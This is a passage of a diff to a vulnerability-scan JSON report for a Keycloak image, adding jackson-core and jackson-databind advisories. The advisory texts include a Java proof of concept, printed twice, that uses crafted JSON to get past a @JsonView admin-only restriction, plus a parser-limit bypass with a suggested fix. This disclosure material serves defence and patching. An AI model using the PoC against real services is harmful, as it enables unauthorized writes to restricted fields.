`StreamConstraintsException` at 155ms after only 5\nDataBuffers, exactly when the accumulated digit count crosses\n`maxNumberLength=1000`. The connection is reset mid-stream rather than the\nparser silently consuming the rest of the attacker's payload.\n\nSide-by-side:\n\n| Build | Chunks accepted before exception | Digits buffered | Time to detection |\n|---|---|---|---|\n| jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit) | 6,548ms — only at terminator |\n| 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment threshold crossed |\n\nNote on the default `@RequestBody Mono\u003cJsonNode\u003e` path: that path cannot\ndistinguish the two builds because Spring's `decodeToMono` joins all\nDataBuffers into one before parsing. The exploitable shape is the\nstreaming-decode path (`Flux\u003cJsonNode\u003e` / `@RequestBody Flux\u003c...\u003e` /\nWebSocket / SSE / any direct `decoder.decode(Flux\u003cDataBuffer\u003e, ...)` call),\nwhich is also what `Jackson2Tokenizer` uses for any streaming JSON\ndeserialization in WebFlux and Quarkus reactive REST.\n\n## Suggested fix\n\nMirror the pattern already used in `_finishFloatFraction`. At every site that returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first. Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:\n\n```diff\n     protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n         int negMod = _numberNegative ? -1 : 0;\n\n         while (true) {\n             if (_inputPtr \u003e= _inputEnd) {\n                 _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n                 _textBuffer.setCurrentLength(outPtr);\n+                _streamReadConstraints.validateIntegerLength(outPtr + negMod);\n                 return _updateTokenToNA();\n             }\n```\n\nNote: `_setIntLength` itself can't be used as-is because it also assigns `_intLength`, and `_intLength` must not be set until the integer is truly complete (subsequent fraction handling reads `_intLength`). The minimal fix is to call only the validator, as shown.\n\nApply the same one-line insertion before each `return _updateTokenToNA();` that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12 lines total).\n\nAlternatively, a heavier refactor: also gate `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops on `outPtr \u003c maxNumberLength` so that the validator fires at the moment the buffer would be enlarged past the limit, rather than waiting for the next chunk boundary. Either approach is sufficient.\n\n## Credit\n\nReported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            }
+          },
+          "References": [
+            "https://github.com/FasterXML/jackson-core",
+            "https://github.com/FasterXML/jackson-core/commit/050b429804dce2a7e08f0be1b0b4c3d040fdb9cd",
+            "https://github.com/FasterXML/jackson-core/commit/4cdd529749da396cc7edf6d4a2aad41d47902641",
+            "https://github.com/FasterXML/jackson-core/commit/c5941e5aae7fd5aeac55d66933cfb82b9aabeef8",
+            "https://github.com/FasterXML/jackson-core/pull/1611",
+            "https://github.com/FasterXML/jackson-core/security/advisories/GHSA-r7wm-3cxj-wff9"
+          ],
+          "PublishedDate": "2026-07-21T21:58:53Z",
+          "LastModifiedDate": "2026-07-21T21:58:53Z"
+        },
+        {
           "VulnerabilityID": "CVE-2026-54512",
           "VendorIDs": [
             "GHSA-j3rv-43j4-c7qm"
@@ -35057,6 +35149,7 @@
           "References": [
             "https://access.redhat.com/errata/RHSA-2026:36839",
             "https://access.redhat.com/errata/RHSA-2026:40895",
+            "https://access.redhat.com/errata/RHSA-2026:41951",
             "https://access.redhat.com/security/cve/CVE-2026-54513",
             "https://bugzilla.redhat.com/2492010",
             "https://bugzilla.redhat.com/2492015",
@@ -35074,7 +35167,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-54513"
           ],
           "PublishedDate": "2026-06-23T21:17:02.333Z",
-          "LastModifiedDate": "2026-07-17T13:18:57.98Z"
+          "LastModifiedDate": "2026-07-21T12:18:57.163Z"
         },
         {
           "VulnerabilityID": "CVE-2026-54513",
@@ -35127,6 +35220,7 @@
           "References": [
             "https://access.redhat.com/errata/RHSA-2026:36839",
             "https://access.redhat.com/errata/RHSA-2026:40895",
+            "https://access.redhat.com/errata/RHSA-2026:41951",
             "https://access.redhat.com/security/cve/CVE-2026-54513",
             "https://bugzilla.redhat.com/2492010",
             "https://bugzilla.redhat.com/2492015",
@@ -35144,7 +35238,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-54513"
           ],
           "PublishedDate": "2026-06-23T21:17:02.333Z",
-          "LastModifiedDate": "2026-07-17T13:18:57.98Z"
+          "LastModifiedDate": "2026-07-21T12:18:57.163Z"
         },
         {
           "VulnerabilityID": "CVE-2026-54514",
@@ -35743,6 +35837,302 @@
           ],
           "PublishedDate": "2026-06-23T22:16:32.073Z",
           "LastModifiedDate": "2026-06-27T20:49:30.977Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59888",
+          "VendorIDs": [
+            "GHSA-3pjw-73gf-8qr5"
+          ],
+          "PkgName": "com.fasterxml.jackson.core:jackson-databind",
+          "PkgPath": "opt/keycloak/bin/client/keycloak-admin-cli-26.7.0.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.21.2",
+            "UID": "4068d85359a2508e"
+          },
+          "InstalledVersion": "2.21.2",
+          "FixedVersion": "2.18.8, 2.21.4",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:9ec42ec33f5c0b14b6de95ba9e4e234b7f5550c09624cdd01ddba8e4b0b5af5b",
+            "DiffID": "sha256:aa0bcd5f682b788d7496b1017d11d3476471443d63fff0332c40193a2968060f"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59888",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:45a20b44984f6fe9050438bffb7f383ae39d64184e1065919c770b17c0948259",
+          "Title": "jackson-databind: @JsonIgnore on a Record property is bypassed with a PropertyNamingStrategy",
+          "Description": "jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.15.0 until 2.18.8, 2.21.4, and 3.1.4, Java Records using a PropertyNamingStrategy can bypass @JsonIgnore because POJOPropertiesCollector._removeUnwantedIgnorals() records an ignored component under its original implicit name before _renameUsing() applies the naming strategy, allowing the renamed JSON key to be assigned to the Record constructor parameter. This issue is fixed in versions 2.18.8, 2.21.4, and 3.1.4.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-915"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://github.com/FasterXML/jackson-databind",
+            "https://github.com/FasterXML/jackson-databind/commit/baa2cdf5ca2b2717fbb88d91955d69d8651df3e4",
+            "https://github.com/FasterXML/jackson-databind/commit/c7c678360624da5bc7eed2152789fa522880db9d",
+            "https://github.com/FasterXML/jackson-databind/pull/5974",
+            "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-3pjw-73gf-8qr5",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59888"
+          ],
+          "PublishedDate": "2026-07-14T17:17:15.137Z",
+          "LastModifiedDate": "2026-07-15T20:18:23.677Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59888",
+          "VendorIDs": [
+            "GHSA-3pjw-73gf-8qr5"
+          ],
+          "PkgName": "com.fasterxml.jackson.core:jackson-databind",
+          "PkgPath": "opt/keycloak/lib/lib/main/com.fasterxml.jackson.core.jackson-databind-2.21.2.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.21.2",
+            "UID": "3ddbd85a29cdc398"
+          },
+          "InstalledVersion": "2.21.2",
+          "FixedVersion": "2.18.8, 2.21.4",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:9ec42ec33f5c0b14b6de95ba9e4e234b7f5550c09624cdd01ddba8e4b0b5af5b",
+            "DiffID": "sha256:aa0bcd5f682b788d7496b1017d11d3476471443d63fff0332c40193a2968060f"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59888",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:45a20b44984f6fe9050438bffb7f383ae39d64184e1065919c770b17c0948259",
+          "Title": "jackson-databind: @JsonIgnore on a Record property is bypassed with a PropertyNamingStrategy",
+          "Description": "jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.15.0 until 2.18.8, 2.21.4, and 3.1.4, Java Records using a PropertyNamingStrategy can bypass @JsonIgnore because POJOPropertiesCollector._removeUnwantedIgnorals() records an ignored component under its original implicit name before _renameUsing() applies the naming strategy, allowing the renamed JSON key to be assigned to the Record constructor parameter. This issue is fixed in versions 2.18.8, 2.21.4, and 3.1.4.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-915"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://github.com/FasterXML/jackson-databind",
+            "https://github.com/FasterXML/jackson-databind/commit/baa2cdf5ca2b2717fbb88d91955d69d8651df3e4",
+            "https://github.com/FasterXML/jackson-databind/commit/c7c678360624da5bc7eed2152789fa522880db9d",
+            "https://github.com/FasterXML/jackson-databind/pull/5974",
+            "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-3pjw-73gf-8qr5",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59888"
+          ],
+          "PublishedDate": "2026-07-14T17:17:15.137Z",
+          "LastModifiedDate": "2026-07-15T20:18:23.677Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59889",
+          "VendorIDs": [
+            "GHSA-5gvw-p9qm-jgwh"
+          ],
+          "PkgName": "com.fasterxml.jackson.core:jackson-databind",
+          "PkgPath": "opt/keycloak/bin/client/keycloak-admin-cli-26.7.0.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.21.2",
+            "UID": "4068d85359a2508e"
+          },
+          "InstalledVersion": "2.21.2",
+          "FixedVersion": "2.21.5, 2.18.9, 2.22.1",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:9ec42ec33f5c0b14b6de95ba9e4e234b7f5550c09624cdd01ddba8e4b0b5af5b",
+            "DiffID": "sha256:aa0bcd5f682b788d7496b1017d11d3476471443d63fff0332c40193a2968060f"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59889",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:97b0208fc659e658d8544f33a23c08be5eb09f9918899e005607d85e86b18042",
+          "Title": "jackson-databind: @JsonView ypassed for @JsonUnwrapped container properties on deserialization",
+          "Description": "jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.18.0 until 2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1, UnwrappedPropertyHandler.processUnwrapped() replays buffered JSON for a @JsonUnwrapped property and calls prop.deserializeAndSet() without a prop.visibleInView(ctxt.getActiveView()) guard, allowing a property annotated with both @JsonView and @JsonUnwrapped to be written from attacker JSON under a less-privileged active view. This issue is fixed in versions 2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-863"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://github.com/FasterXML/jackson-databind",
+            "https://github.com/FasterXML/jackson-databind/commit/d627a8a86fcb062429282f79f3f256f181ed2c7b",
+            "https://github.com/FasterXML/jackson-databind/issues/6060",
+            "https://github.com/FasterXML/jackson-databind/pull/6056",
+            "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-5gvw-p9qm-jgwh",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59889"
+          ],
+          "PublishedDate": "2026-07-14T21:17:06.16Z",
+          "LastModifiedDate": "2026-07-16T16:19:15.79Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59889",
+          "VendorIDs": [
+            "GHSA-5gvw-p9qm-jgwh"
+          ],
+          "PkgName": "com.fasterxml.jackson.core:jackson-databind",
+          "PkgPath": "opt/keycloak/lib/lib/main/com.fasterxml.jackson.core.jackson-databind-2.21.2.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.21.2",
+            "UID": "3ddbd85a29cdc398"
+          },
+          "InstalledVersion": "2.21.2",
+          "FixedVersion": "2.21.5, 2.18.9, 2.22.1",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:9ec42ec33f5c0b14b6de95ba9e4e234b7f5550c09624cdd01ddba8e4b0b5af5b",
+            "DiffID": "sha256:aa0bcd5f682b788d7496b1017d11d3476471443d63fff0332c40193a2968060f"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59889",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:97b0208fc659e658d8544f33a23c08be5eb09f9918899e005607d85e86b18042",
+          "Title": "jackson-databind: @JsonView ypassed for @JsonUnwrapped container properties on deserialization",
+          "Description": "jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.18.0 until 2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1, UnwrappedPropertyHandler.processUnwrapped() replays buffered JSON for a @JsonUnwrapped property and calls prop.deserializeAndSet() without a prop.visibleInView(ctxt.getActiveView()) guard, allowing a property annotated with both @JsonView and @JsonUnwrapped to be written from attacker JSON under a less-privileged active view. This issue is fixed in versions 2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-863"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://github.com/FasterXML/jackson-databind",
+            "https://github.com/FasterXML/jackson-databind/commit/d627a8a86fcb062429282f79f3f256f181ed2c7b",
+            "https://github.com/FasterXML/jackson-databind/issues/6060",
+            "https://github.com/FasterXML/jackson-databind/pull/6056",
+            "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-5gvw-p9qm-jgwh",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59889"
+          ],
+          "PublishedDate": "2026-07-14T21:17:06.16Z",
+          "LastModifiedDate": "2026-07-16T16:19:15.79Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-mhm7-754m-9p8w",
+          "PkgName": "com.fasterxml.jackson.core:jackson-databind",
+          "PkgPath": "opt/keycloak/bin/client/keycloak-admin-cli-26.7.0.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.21.2",
+            "UID": "4068d85359a2508e"
+          },
+          "InstalledVersion": "2.21.2",
+          "FixedVersion": "2.18.9, 2.21.5",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:9ec42ec33f5c0b14b6de95ba9e4e234b7f5550c09624cdd01ddba8e4b0b5af5b",
+            "DiffID": "sha256:aa0bcd5f682b788d7496b1017d11d3476471443d63fff0332c40193a2968060f"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-mhm7-754m-9p8w",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:39b344673ffb143133d9c1056cf29bada1807e231f206fb64021ea0e60cac48a",
+          "Title": "jackson-databind: `@JsonView` bypass for creator properties with `@JsonTypeInfo(include=As.EXTERNAL_PROPERTY)`",
+          "Description": "## Summary\n\nIn `BeanDeserializer.deserializeUsingPropertyBasedWithExternalTypeId`, the active-view (`@JsonView`) filter was applied only to the regular bean-property branch; the creator-property branch performed no `creatorProp.visibleInView(activeView)` check. A constructor parameter annotated with both `@JsonView(RestrictedView.class)` and `@JsonTypeInfo(use=Id.NAME,\n  include=As.EXTERNAL_PROPERTY)` is populated from attacker JSON even when a more restrictive view is active.\n\n  This is a patch gap. GHSA-5hh8 (CVE-2026-54517) and GHSA-rcqc (CVE-2026-54518) descriptions cover only the main property-based path and the unwrapped-creator path respectively; the external-type-id creator path was fixed on the 3.x line via #6004 (\"Extend #5969/#5971 fixes to ... external-type-id case in regular BeanDeserializer\", commit 7dc7a17, 2026-05-22) but\n  **the fix was never backported to 2.21 or 2.18**. Users on 2.21.4 and 2.18.8 who upgraded per the published advisories remain vulnerable to the same `@JsonView` bypass technique via a different code path.\n\n## Vulnerable Code Path\n\nFile: `com/fasterxml/jackson/databind/deser/BeanDeserializer.java`\nMethod: `deserializeUsingPropertyBasedWithExternalTypeId`\n\nOn 2.21.4 (and 2.18.8), the creator-property branch (around line 1125-1158) checks `creatorProp.isInjectionOnly()` and hands off to `ext.handlePropertyValue(...)` / `buffer.assignParameter(...)` without ever consulting `visibleInView(activeView)`:\n\n ```java\n  if (creatorProp != null) {\n      // [databind#1381]: if useInput=FALSE, skip deserialization from input\n      if (creatorProp.isInjectionOnly()) { ... }\n      // NO visibleInView(activeView) CHECK HERE\n      if (!ext.handlePropertyValue(p, ctxt, propName, null)) {\n          if (buffer.assignParameter(creatorProp, ...)) { ... }\n      }\n      continue;\n  }\n```\n\nOn 3.1.4, the same branch contains the additional guard (commit 7dc7a17):\n\n ```java\n   if (creatorProp != null) {\n      // [databind#5971]: must honor active view here too\n      if ((activeView != null) \u0026\u0026 !creatorProp.visibleInView(activeView)) {\n          p.skipChildren();\n          continue;\n      }\n      ...\n  }\n```\n\nThe 2.21 and 2.18 backport PRs (#6005 and #6003) only backported the main-path fixes from #5969/#5971; the external-type-id fix from #6004 was not backported. The maintainer closed #6005\n  with \"got changes merged forward, looks like it's all covered now\", but the forward-merge did not include the ExtTypeId creator branch.\n\n  Proof of Concept\n\n  Compiles and runs against jackson-databind 2.21.4:\n \n```java\n  import com.fasterxml.jackson.annotation.*;\n  import com.fasterxml.jackson.databind.ObjectMapper;\n\n  public class JsonViewExternalTypeIdBypass {\n      public static class PublicView {}\n      public static class AdminView extends PublicView {}\n\n      public static abstract class Asset { public String name; }\n      public static class PublicAsset extends Asset {}\n      public static class AdminAsset extends Asset { public String secret; }\n\n      public static class Container {\n          @JsonTypeInfo(use = JsonTypeInfo.Id.NAME,\n                  include = JsonTypeInfo.As.EXTERNAL_PROPERTY,\n                  property = \"kind\")\n          @JsonSubTypes({\n              @JsonSubTypes.Type(value = PublicAsset.class, name = \"pub\"),\n              @JsonSubTypes.Type(value = AdminAsset.class,  name = \"admin\")\n          })\n          @JsonView(AdminView.class)\n          public Asset asset;\n\n          public String label;\n\n          @JsonCreator\n          public Container(\n                  @JsonProperty(\"label\") String label,\n                  @JsonProperty(\"asset\") @JsonView(AdminView.class) Asset asset) {\n              this.label = label;\n              this.asset = asset;\n          }\n      }\n\n      public static class Wrapper {\n          @JsonView(PublicView.class)\n          public Container data;\n      }\n\n      public static void main(String[] args) throws Exception {\n          // Admin-only \"asset\" should be blocked when reading with PublicView\n          String json = \"{\\\"data\\\":{\\\"label\\\":\\\"hello\\\",\\\"kind\\\":\\\"admin\\\",\"\n                      + \"\\\"asset\\\":{\\\"name\\\":\\\"foo\\\",\\\"secret\\\":\\\"LEAKED\\\"}}}\";\n\n          ObjectMapper om = new ObjectMapper();\n          Wrapper r = om.readerWithView(PublicView.class)\n                  .forType(Wrapper.class)\n                  .readValue(json);\n\n          System.out.println(r.data);\n          // Actual on 2.21.4:   Container{label='hello', asset=AdminAsset{name='foo', secret='LEAKED'}}\n          // Expected (secure):  Container{label='hello', asset=null}\n          if (r.data.asset != null \u0026\u0026 r.data.asset instanceof AdminAsset) {\n              System.out.println(\"[!!] BYPASS CONFIRMED — admin-only asset populated under PublicView\");\n          }\n      }\n  }\n```\n\nA control case that removes include = As.EXTERNAL_PROPERTY (forcing the normal property-based path) correctly returns asset = null, confirming the bypass is specific to the ExternalTypeId\n  code path and not a misconfiguration.\n\n### Impact\n\n  View-restricted (e.g. admin-only) creator properties can be populated from untrusted input where @JsonView is used as a write-side authorization boundary. Typical victims are Spring Boot\n  REST controllers that use @JsonView(PublicView.class) on the request body to whitelist user-settable fields — an attacker can inject the restricted creator parameter (including choosing\n  the polymorphic subtype via the sibling kind/type-id property) by combining it with a polymorphic @JsonTypeInfo(EXTERNAL_PROPERTY) annotation on the same field.\n\n- CWE-863 (Incorrect Authorization)\n- Same impact class as CVE-2026-54517 / CVE-2026-54518\n- No RCE, no DoS — this is an access-control / mass-assignment bypass\n\n### Trigger Conditions\n\nDeveloper code must combine (no opt-in user configuration required):\n\n1. Property-based @JsonCreator on the outer type\n2. A creator parameter annotated with @JsonView(RestrictedView.class)\n3. The same parameter annotated with @JsonTypeInfo(use=Id.NAME, include=As.EXTERNAL_PROPERTY, property=\"...\")",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://github.com/FasterXML/jackson-databind",
+            "https://github.com/FasterXML/jackson-databind/commit/c628b357ed143d8492756d5c1458cfb9fbeb29ed",
+            "https://github.com/FasterXML/jackson-databind/commit/dea7eb466e98cc226c4ac65587581fb49926820c",
+            "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-mhm7-754m-9p8w"
+          ],
+          "PublishedDate": "2026-07-21T19:40:12Z",
+          "LastModifiedDate": "2026-07-21T19:40:12Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-mhm7-754m-9p8w",
+          "PkgName": "com.fasterxml.jackson.core:jackson-databind",
+          "PkgPath": "opt/keycloak/lib/lib/main/com.fasterxml.jackson.core.jackson-databind-2.21.2.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.21.2",
+            "UID": "3ddbd85a29cdc398"
+          },
+          "InstalledVersion": "2.21.2",
+          "FixedVersion": "2.18.9, 2.21.5",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:9ec42ec33f5c0b14b6de95ba9e4e234b7f5550c09624cdd01ddba8e4b0b5af5b",
+            "DiffID": "sha256:aa0bcd5f682b788d7496b1017d11d3476471443d63fff0332c40193a2968060f"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-mhm7-754m-9p8w",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:39b344673ffb143133d9c1056cf29bada1807e231f206fb64021ea0e60cac48a",
+          "Title": "jackson-databind: `@JsonView` bypass for creator properties with `@JsonTypeInfo(include=As.EXTERNAL_PROPERTY)`",
+          "Description": "## Summary\n\nIn `BeanDeserializer.deserializeUsingPropertyBasedWithExternalTypeId`, the active-view (`@JsonView`) filter was applied only to the regular bean-property branch; the creator-property branch performed no `creatorProp.visibleInView(activeView)` check. A constructor parameter annotated with both `@JsonView(RestrictedView.class)` and `@JsonTypeInfo(use=Id.NAME,\n  include=As.EXTERNAL_PROPERTY)` is populated from attacker JSON even when a more restrictive view is active.\n\n  This is a patch gap. GHSA-5hh8 (CVE-2026-54517) and GHSA-rcqc (CVE-2026-54518) descriptions cover only the main property-based path and the unwrapped-creator path respectively; the external-type-id creator path was fixed on the 3.x line via #6004 (\"Extend #5969/#5971 fixes to ... external-type-id case in regular BeanDeserializer\", commit 7dc7a17, 2026-05-22) but\n  **the fix was never backported to 2.21 or 2.18**. Users on 2.21.4 and 2.18.8 who upgraded per the published advisories remain vulnerable to the same `@JsonView` bypass technique via a different code path.\n\n## Vulnerable Code Path\n\nFile: `com/fasterxml/jackson/databind/deser/BeanDeserializer.java`\nMethod: `deserializeUsingPropertyBasedWithExternalTypeId`\n\nOn 2.21.4 (and 2.18.8), the creator-property branch (around line 1125-1158) checks `creatorProp.isInjectionOnly()` and hands off to `ext.handlePropertyValue(...)` / `buffer.assignParameter(...)` without ever consulting `visibleInView(activeView)`:\n\n ```java\n  if (creatorProp != null) {\n      // [databind#1381]: if useInput=FALSE, skip deserialization from input\n      if (creatorProp.isInjectionOnly()) { ... }\n      // NO visibleInView(activeView) CHECK HERE\n      if (!ext.handlePropertyValue(p, ctxt, propName, null)) {\n          if (buffer.assignParameter(creatorProp, ...)) { ... }\n      }\n      continue;\n  }\n```\n\nOn 3.1.4, the same branch contains the additional guard (commit 7dc7a17):\n\n ```java\n   if (creatorProp != null) {\n      // [databind#5971]: must honor active view here too\n      if ((activeView != null) \u0026\u0026 !creatorProp.visibleInView(activeView)) {\n          p.skipChildren();\n          continue;\n      }\n      ...\n  }\n```\n\nThe 2.21 and 2.18 backport PRs (#6005 and #6003) only backported the main-path fixes from #5969/#5971; the external-type-id fix from #6004 was not backported. The maintainer closed #6005\n  with \"got changes merged forward, looks like it's all covered now\", but the forward-merge did not include the ExtTypeId creator branch.\n\n  Proof of Concept\n\n  Compiles and runs against jackson-databind 2.21.4:\n \n```java\n  import com.fasterxml.jackson.annotation.*;\n  import com.fasterxml.jackson.databind.ObjectMapper;\n\n  public class JsonViewExternalTypeIdBypass {\n      public static class PublicView {}\n      public static class AdminView extends PublicView {}\n\n      public static abstract class Asset { public String name; }\n      public static class PublicAsset extends Asset {}\n      public static class AdminAsset extends Asset { public String secret; }\n\n      public static class Container {\n          @JsonTypeInfo(use = JsonTypeInfo.Id.NAME,\n                  include = JsonTypeInfo.As.EXTERNAL_PROPERTY,\n                  property = \"kind\")\n          @JsonSubTypes({\n              @JsonSubTypes.Type(value = PublicAsset.class, name = \"pub\"),\n              @JsonSubTypes.Type(value = AdminAsset.class,  name = \"admin\")\n          })\n          @JsonView(AdminView.class)\n          public Asset asset;\n\n          public String label;\n\n          @JsonCreator\n          public Container(\n                  @JsonProperty(\"label\") String label,\n                  @JsonProperty(\"asset\") @JsonView(AdminView.class) Asset asset) {\n              this.label = label;\n              this.asset = asset;\n          }\n      }\n\n      public static class Wrapper {\n          @JsonView(PublicView.class)\n          public Container data;\n      }\n\n      public static void main(String[] args) throws Exception {\n          // Admin-only \"asset\" should be blocked when reading with PublicView\n          String json = \"{\\\"data\\\":{\\\"label\\\":\\\"hello\\\",\\\"kind\\\":\\\"admin\\\",\"\n                      + \"\\\"asset\\\":{\\\"name\\\":\\\"foo\\\",\\\"secret\\\":\\\"LEAKED\\\"}}}\";\n\n          ObjectMapper om = new ObjectMapper();\n          Wrapper r = om.readerWithView(PublicView.class)\n                  .forType(Wrapper.class)\n                  .readValue(json);\n\n          System.out.println(r.data);\n          // Actual on 2.21.4:   Container{label='hello', asset=AdminAsset{name='foo', secret='LEAKED'}}\n          // Expected (secure):  Container{label='hello', asset=null}\n          if (r.data.asset != null \u0026\u0026 r.data.asset instanceof AdminAsset) {\n              System.out.println(\"[!!] BYPASS CONFIRMED — admin-only asset populated under PublicView\");\n          }\n      }\n  }\n```\n\nA control case that removes include = As.EXTERNAL_PROPERTY (forcing the normal property-based path) correctly returns asset = null, confirming the bypass is specific to the ExternalTypeId\n  code path and not a misconfiguration.\n\n### Impact\n\n  View-restricted (e.g. admin-only) creator properties can be populated from untrusted input where @JsonView is used as a write-side authorization boundary. Typical victims are Spring Boot\n  REST controllers that use @JsonView(PublicView.class) on the request body to whitelist user-settable fields — an attacker can inject the restricted creator parameter (including choosing\n  the polymorphic subtype via the sibling kind/type-id property) by combining it with a polymorphic @JsonTypeInfo(EXTERNAL_PROPERTY) annotation on the same field.\n\n- CWE-863 (Incorrect Authorization)\n- Same impact class as CVE-2026-54517 / CVE-2026-54518\n- No RCE, no DoS — this is an access-control / mass-assignment bypass\n\n### Trigger Conditions\n\nDeveloper code must combine (no opt-in user configuration required):\n\n1. Property-based @JsonCreator on the outer type\n2. A creator parameter annotated with @JsonView(RestrictedView.class)\n3. The same parameter annotated with 